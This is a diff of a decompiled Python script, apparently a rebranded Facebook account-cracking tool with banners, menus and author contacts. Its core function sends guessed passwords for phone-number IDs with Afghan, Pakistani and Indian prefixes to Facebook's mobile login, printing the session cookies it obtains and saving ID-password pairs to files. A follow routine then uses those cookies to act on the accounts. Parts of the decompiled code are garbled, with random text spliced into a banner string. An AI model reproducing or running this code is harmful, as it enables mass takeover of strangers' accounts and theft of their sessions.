@@ -1,5 +1,6 @@
 # Source Generated with Decompyle++
 # File: test.pyc (Python 3.9)
+#If You Wanna Take Credits For This Code, Please Look Yourself Again...
 
 import os
 import sys
@@ -15,16 +16,16 @@ class jalan:
         pass
 
 
-logo = '   \n\x1b[1;32m       d8888 8888888b.  8888888 Y88b   d88P     d8888 888b    888   \n\x1b[1;35m       d88888 888   Y88b   888    Y88b d88P     d88888 8888b   888 .      \n\x1b[1;32m       d88P888 888    888   888     Y88o88P     d88P888 88888b  888   \n\x1b[1;32m       d88P 888 888   d88P   888      Y888P     d88P 888 888Y88b 888  \n\x1b[1;35m       d88P  888 8888888P"    888       888     d88P  888 888 Y88b888 \n\x1b[1;35m       d88P   888 888 T88b     888       888    d88P   888 888  Y88888 \n\x1b[1;32m       d88P     888 888   T88b 8888888     888  d88P     888 888    Y888   \n\n\x1b[1;37m================= \x1b[32;45mKASHIF\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mARYAN\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mARYAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
+logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVx1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
 
 def ud():
     os.system('clear')
     jalan(logo)
-    print(' [1] FOLLOW ME ON FB')
+    print(' [1] FOLLOW MY FACEBOOK')
     print(' [2] EXIT')
     opt = input('\n   Choose option >>> ')
     if opt == '1':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100028315179402')
+        os.system('https://www.facebook.com/profile.php?id=100028315179402')
         FD()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
@@ -33,11 +34,11 @@ def ud():
 def FD():
     os.system('clear')
     print(logo)
-    print('\x1b[1;33m [1] SUBSCRIBE MY CHANNEL FOR APPROVED')
+    print('\x1b[1;33m [1] FOLLOW MY FACEBOOK')
     print(' [2] EXIT')
     opt = input('\n  \x1b[1;32m Choose option >>> ')
     if opt == '1':
-        os.system('xdg-open https://www.youtube.com/@Saadat.Technical')
+        ('https://www.facebook.com/profile.php?id=100028315179402')
         o()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
@@ -46,23 +47,24 @@ def FD():
 def o():
     os.system('clear')
     jalan(logo)
-    jalan('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')
+    jalan('\t????RANDOM NUMBER CRACK????')
     print('')
     jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
     jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
-    jalan(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
-    jalan(' \x1b[1;32m[4] \x1b[1;32mJOIN FB GROUP')
+    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW MY FACEBOOK')
+    jalan(' \x1b[1;32m[4] \x1b[1;32mFOLLOW MY FACEBOOK')
     jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
     opt = input('\n   \x1b[1;32m Choose option >>> ')
     if opt == '1':
         i()
     if None == '2':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100028315179402')
+        ('https://www.facebook.com/profile.php?id=100028315179402')
         return None
     if None == '3':
-        os.system('xdg-open https://www.youtube.com/@Saadat.Technical')
+        os.system('https://www.facebook.com/profile.php?id=100028315179402')
         return None
     if None == '4':
+        os.system('https://www.facebook.com/profile.php?id=100028315179402')
         return None
     if None == '0':
         os.system('exit')
@@ -96,7 +98,7 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
     else:
-        print(f'\r[ðŸŽ®] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
+        print(f'\r[??] %s \x1b[1;95m ? Your Active Apps ?     :{WHITE}'%(GREEN))
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
         #else:
@@ -108,14 +110,14 @@ def cek_apk(session,coki):
     if len(game)==0:
         print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
     else:
-        print(f'\r[ðŸŽ®] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
+        print(f'\r[??] %s \x1b[1;95m ? Your Expired Apps ?    :{WHITE}'%(M))
         for i in range(len(game)):
             print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
         else:
             print('')
  
 def follow(self, session, coki):
-        r = BeautifulSoup(session.get('xdg-open https://www.facebook.com/profile.php?id=100028315179402', {
+        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
             'cookie': coki }, **('cookies',)).text, 'html.parser')
         get = r.find('a', 'Ikuti', **('string',)).get('href')
         session.get('https://free.facebook.com' + str(get), {
@@ -163,7 +165,7 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-logo =                                          ("""   
+logo =                                          f"""{H}
       \033[1;39m .########...######..##.....##
       \033[1;32m .##.....##.##....##.##.....##
       \033[1;39m .##.....##.##.......##.....##
@@ -171,18 +173,16 @@ logo =                                          ("""
       \033[1;39m .##...##.........##.##.....##
       \033[1;32m .##....##..##....##.##.....##
       \033[1;39m .##.....##..######..##.....##
-\033[1;37m================= \33[32;45mSaadat\33[0;m =====================
-\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mSaadat\33[0;m\033[1;32m && \033[1;33mSaadat\33[0;m
-\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Raziqullah Saadat
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35m  Arman
-\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36m FREE
-\033[1;32m     \033[1;35mTEAM         :  \033[1;35mSaadat
-\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m0.2
-\033[1;37m================= \33[32;45mSaadat\33[0;m =====================
- 
-       \33[37;41m\t WELCOME TO SaadatTOOL\33[0;m
- 
-\033[1;37m================== \33[32;45mSaadat\33[0;m ======================\n""")
+\033[1;37m WELL COME 
+\033[1;31m\033[1;32m \033[1;32mOWNER\033[1;31m \033[1;32m     Raziqullah Saadat \033[1;31m
+\033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32m Raziqullah Saadat \033[1;31m 
+\033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32m   ARMAN\033[1;31m 
+\033[1;31m\033[1;32m\033[1;32mWHATSAPP \033[1;31m\033[1;32m +93702856593 \033[1;31m 
+\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 10.00\033[1;31m 
+\033[1;37mMESSENGER GROUP Saadat HACKERS{ M }\033[1;37m 
+\033[1;92m==========================================================
+\033[33;44m NAME YAD SATYE Raziqullah Saadat  \033[0;m
+\033[1;92m=========================================================="""      
 loop = 0
 oks = []
 cps = []
@@ -237,7 +237,7 @@ for xd in range(10000):
     uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
     ugen.append(uaku2)
     
-# AFG CHECK
+# APK CHECK
 def i():
     user=[]
     twf =[]
@@ -247,10 +247,10 @@ def i():
     jalan(logo)
     
     
-    jalan("\033[1;37m\t  USE ALL COUNTRY CODE  ")
+    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
     jalan('\033[1;36m     \t     AFG CODES\n     \033[1;33m9370, \033[1;33m9377 ,\033[1;33m9378 ,\033[1;33m9370  ...\033[0;97m')
     jalan('\033[1;32m============================================')
-    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
+    jalan('\033[1;36m     \t     PAK CODES\n     \033[1;33m92301, \033[1;33m9379 ,\033[1;33m9377 ,\033[1;33m9371  ...\033[0;97m')
     jalan('\033[1;32m============================================')
     jalan('\033[1;36m     \t     INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
     jalan('\033[1;32m============================================\n')
@@ -308,37 +308,35 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'x.facebook.com',
-           'method': 'POST',
-           'scheme': 'https',
-           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-           'accept-language': 'en-US,en;q=0.9',
-           'cache-control': 'max-age=0',
-           'referer': 'https://x.facebook.com/',
-           'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-           'sec-ch-ua-mobile': '?1',
-           'sec-ch-ua-platform': '"Android"',
-           'sec-fetch-dest': 'document',
-           'sec-fetch-mode': 'navigate',
-           'sec-fetch-site': 'none',
-           'sec-fetch-user': '?1',
-           'upgrade-insecure-requests': '1',
-           'user-agent': pro}
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'referer': 'https://x.facebook.com/',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
             lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(Saadat-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(Saadat -OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/AYAAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
-                oks.append(cid)
+                open('/sdcard/HAROON😋-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(Saadat-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/AYAAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
-                cps.append(cid)
+                print('    \33[1;30m(Saadat-CP??)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                open('/sdcard/HAROON-CP.txt', 'a').write(uid+' | '+ps+' \n')
+                cps.append(uid)
                 break
             else:
                 continue
